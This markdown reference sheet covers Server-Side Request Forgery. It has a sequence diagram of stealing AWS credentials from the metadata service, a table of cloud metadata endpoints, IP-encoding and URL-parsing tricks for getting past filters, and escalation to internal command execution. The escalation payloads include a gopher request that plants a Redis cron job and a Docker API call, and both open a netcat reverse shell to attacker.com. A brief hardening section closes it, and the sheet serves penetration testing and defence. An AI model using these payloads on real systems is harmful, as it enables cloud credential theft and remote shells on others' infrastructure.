# Mechanism: Backend SSRF, Cloud Metadata & Internal RCE

## 1. Architectural Vulnerability Profile
*   **Vulnerability Class:** Server-Side Request Forgery (SSRF) / Cloud Metadata Extraction / Internal Pivoting
*   **STRIDE Category:** Information Disclosure, Elevation of Privilege, Tampering
*   **Trust Boundary Crossed:** External Untrusted Client $\rightarrow$ Application Server (Backend Worker / Renderer / Webhook Client) $\rightarrow$ Internal VPC Network, Cloud Metadata Service (169.254.169.254), or Localhost Services
*   **Target Environments:** AWS (EC2, ECS, Lambda), Google Cloud Platform (GCE, Cloud Run), Microsoft Azure, Kubernetes clusters, Docker daemons, internal microservice fabrics.

---

## 2. High-Signal Cloud & Container Metadata Targets

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant App as Target Backend Application
    participant IMDS as Cloud Metadata Service (169.254.169.254)
    participant Cloud as Cloud Provider IAM / STS

    Note over Attacker,App: 1. SSRF Injection via API/Webhook/PDF
    Attacker->>App: POST /api/export (url="http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    App->>IMDS: GET /latest/meta-data/iam/security-credentials/
    IMDS-->>App: Returns role name (e.g. "prod-app-role")
    
    Note over Attacker,App: 2. Exfiltrate Temporary STS Credentials
    Attacker->>App: POST /api/export (url="http://169.254.169.254/.../prod-app-role")
    App->>IMDS: GET credentials
    IMDS-->>App: Returns AccessKeyId, SecretAccessKey, Token
    App-->>Attacker: Leaks AWS STS session tokens!

    Note over Attacker,Cloud: 3. Full Cloud Takeover
    Attacker->>Cloud: Authenticates with stolen STS keys
    Cloud-->>Attacker: Unrestricted access to S3, RDS, DynamoDB, Secrets Manager!
```

### Complete Cloud Metadata Target Matrix

| Cloud Provider | Target Endpoint URL | Required Headers / Notes |
|---|---|---|
| **AWS IMDSv1** | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>` | No headers required |
| **AWS IMDSv2** | Step 1: `PUT http://169.254.169.254/latest/api/token`<br>Step 2: `GET /latest/meta-data/` | `X-aws-ec2-metadata-token-ttl-seconds: 21600`<br>`X-aws-ec2-metadata-token: <TOKEN>` |
| **GCP (Google Cloud)** | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | `Metadata-Flavor: Google` |
| **Microsoft Azure** | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` | `Metadata: true` |
| **Kubernetes Pods** | `file:///var/run/secrets/kubernetes.io/serviceaccount/token` | Read service account token for K8s API |
| **DigitalOcean** | `http://169.254.169.254/metadata/v1/id` | Drops droplet metadata |
| **Alibaba Cloud** | `http://100.100.100.200/latest/meta-data/` | Alibaba internal metadata IP |
| **Oracle Cloud (OCI)** | `http://169.254.169.254/opc/v1/instance/` | Oracle Cloud Infrastructure instance data |

---

## 3. IP Encoding & Filter Bypass Matrix

Applications frequently block literal strings like `127.0.0.1` or `169.254.169.254`. Use these mathematical representations:

| Bypass Mechanism | Payload for `127.0.0.1` | Payload for `169.254.169.254` |
|---|---|---|
| **Decimal (Dword) IP** | `http://2130706433` | `http://2852039166` |
| **Hexadecimal IP** | `http://0x7f000001` | `http://0xa9fea9fe` |
| **Octal IP** | `http://0177.0.0.1` | `http://0251.0376.0251.0376` |
| **IPv6 Mapped IPv4** | `http://[::ffff:127.0.0.1]` | `http://[::ffff:169.254.169.254]` |
| **IPv6 Localhost** | `http://[::1]` or `http://[0:0:0:0:0:0:0:1]` | N/A |
| **DNS Wildcard Services** | `http://127.0.0.1.nip.io` | `http://169.254.169.254.nip.io` |
| **Shortened Class-A Notation** | `http://127.1` or `http://0/` | N/A |

---

## 4. URL Parser Confusion & Authority Splitting

When an edge proxy/WAF validates the hostname against a whitelist before passing to the backend client (e.g. Python `urllib` vs `requests` vs cURL):

```text
# 1. Authority Confusion via Userinfo (@ symbol)
http://whitelisted.com@169.254.169.254/
http://169.254.169.254#@whitelisted.com/

# 2. Path & Fragment Confusion
http://whitelisted.com#@169.254.169.254/
http://whitelisted.com:80#@169.254.169.254/

# 3. Protocol Downgrade / Scheme Confusion
file:///etc/passwd
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
dict://127.0.0.1:11211/stat

# 4. Open Redirect Chaining
# The application allows any URL under its own domain:
https://target.com/export?url=https://target.com/redirect?to=http://169.254.169.254/
```

---

## 5. Escalation: From SSRF to Internal RCE

### A. Gopher Protocol to Redis Exploitation
If the server supports `gopher://`, an attacker can send arbitrary raw TCP commands to internal unauthenticated Redis servers (`port 6379`):
```text
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/spool/cron%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSET%20payload%20%22%2a%20%2a%20%2a%20%2a%20%2a%20nc%20attacker.com%204444%20-e%20/bin/sh%22%0d%0aSAVE%0d%0a
```

### B. Docker Engine API RCE
If internal port `2375` or `/var/run/docker.sock` is exposed:
```http
POST /containers/create HTTP/1.1
Host: 127.0.0.1:2375
Content-Type: application/json

{"Image": "alpine", "Cmd": ["/bin/sh", "-c", "nc attacker.com 4444 -e /bin/sh"], "Binds": ["/:/mnt/host"]}
```

### C. Kubernetes Kubelet & API Server Pivot
Reaching `https://kubernetes.default.svc` or `http://127.0.0.1:10255/pods` (unauthenticated read-only port) reveals pod secrets and environmental tokens.

---

## 6. Defensive Hardening
1. **Enforce AWS IMDSv2 Globally:** Require `HttpTokens=required` and set `HttpPutResponseHopLimit=1` to prevent intermediate forwarders from hopping to metadata.
2. **Strict IP Whitelisting (Deny-by-Default):** Validate parsed host IP addresses after DNS resolution, ensuring they do not belong to RFC 1918 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) or link-local (`169.254.0.0/16`, `127.0.0.0/8`).
3. **Disable Unnecessary Protocols:** Disable `file://`, `gopher://`, `dict://`, and `ftp://` in application HTTP clients.
